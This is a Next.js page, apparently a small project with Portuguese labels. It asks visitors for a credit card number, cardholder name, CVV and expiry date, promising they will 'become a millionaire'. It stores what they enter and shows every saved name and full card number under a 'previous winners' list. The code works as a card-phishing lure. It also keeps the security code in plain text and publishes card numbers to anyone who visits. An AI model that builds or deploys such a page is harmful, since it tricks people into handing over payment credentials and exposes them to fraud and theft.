import { GetServerSideProps } from 'next'
import { useState } from 'react'
import { useForm } from 'react-hook-form'
import { prisma } from '../../lib/prisma'

interface Card {
  id: string
  number: string
  name: string
  CVV: string
  expires_in: string
}

interface FormFields extends Omit<Card, 'id'> {}

export default function Home({ cards: cardsFromServer }: { cards: Card[] }) {
  const {
    register,
    handleSubmit,
    formState: { isSubmitting },
  } = useForm<FormFields>()

  const [cards, setCards] = useState(cardsFromServer)

  async function onSubmitCard(data: FormFields) {
    await fetch('/api/card/', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: {
        'Content-Type': 'application/json; charset=UTF-8',
      },
    })
      .then(res => res.json())
      .then((data: Card) => {
        setCards(prevCards => [...prevCards, data!])
      })
  }

  return (
    <div className='w-screen min-h-screen flex flex-col items-center justify-center p-2'>
      <form
        onSubmit={handleSubmit(onSubmitCard)}
        className='w-full  max-w-xl flex flex-col '
      >
        <label className='flex flex-col gap-1 my-2'>
          <span className='block font-medium'>Número do cartão:</span>
          <input
            className='border border-indigo-200 p-2 rounded w-full'
            type='text'
            id='number'
            {...register('number')}
          />
        </label>
        <label className='flex flex-col gap-1 my-2'>
          <span className='block font-medium'>Nome no cartão:</span>
          <input
            className='border border-indigo-200 p-2 rounded w-full'
            type='text'
            id='name'
            {...register('name')}
          />
        </label>
        <label className='flex flex-col gap-1 my-2'>
          <span className='block font-medium'>Código de segurança (CVV):</span>
          <input
            className='border border-indigo-200 p-2 rounded w-full'
            type='text'
            id='CVV'
            {...register('CVV')}
          />
        </label>
        <label className='flex flex-col gap-1 my-2'>
          <span className='block font-medium'>Data de validade:</span>
          <input
            className='border border-indigo-200 p-2 rounded w-full'
            type='text'
            id='expires_in'
            {...register('expires_in')}
          />
        </label>
        <button
          disabled={isSubmitting}
          type='submit'
          className='bg-indigo-800 w-full rounded p-2 text-white scale-100 cursor-pointer hover:scale-105 transition-all hover:bg-indigo-900 disabled:cursor-auto disabled:pointer-events-none'
        >
          Ficar Milionário
        </button>
      </form>
      <div className='w-full max-w-xl flex flex-col mt-8 text-center'>
        <h1 className='text-4xl mb-2'>Ganhadores Anteriores</h1>
        <ul className='w-full gap-2 flex flex-col '>
          {cards.map(card => (
            <li className='flex items-center justify-between' key={card.id}>
              <h2 className='font-medium'>{card.name}</h2>
              <span className='text-sm text-gray-600'>{card.number}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

export const getServerSideProps: GetServerSideProps = async context => {
  const cards = await prisma.card.findMany()

  return {
    props: {
      cards,
    },
  }
}
